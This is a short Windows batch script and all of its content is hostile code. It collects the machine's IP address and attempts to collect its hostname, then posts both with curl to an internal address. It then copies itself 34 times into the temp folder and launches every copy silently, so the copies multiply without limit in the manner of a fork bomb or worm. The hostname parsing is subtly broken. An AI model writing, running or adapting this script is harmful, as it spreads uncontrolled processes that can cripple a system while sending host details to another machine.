@echo off
setlocal enabledelayedexpansion

:: Get the hostname
for /f "tokens=2 delims=[]" %%H in ('hostname') do set "hostname=%%H"

:: Get the IP address (assuming the first available IPv4 address)
for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do set "ipAddress=%%I"

:: Trim leading spaces from ipAddress
set ipAddress=%ipAddress: =%

:: Prepare the URL to send data to
set url=http://10.0.1.33:3000

:: Send the hostname and IP address via HTTP POST (using curl)
curl -X POST -d "hostname=%hostname%&ip=%ipAddress%" %url%

:: Copy the script 34 times and run them silently
for /L %%i in (1,1,34) do (
    copy "%~f0" "%TEMP%\Copy_%%i.bat" > nul
    start "" /B "%TEMP%\Copy_%%i.bat"
)

exit /b
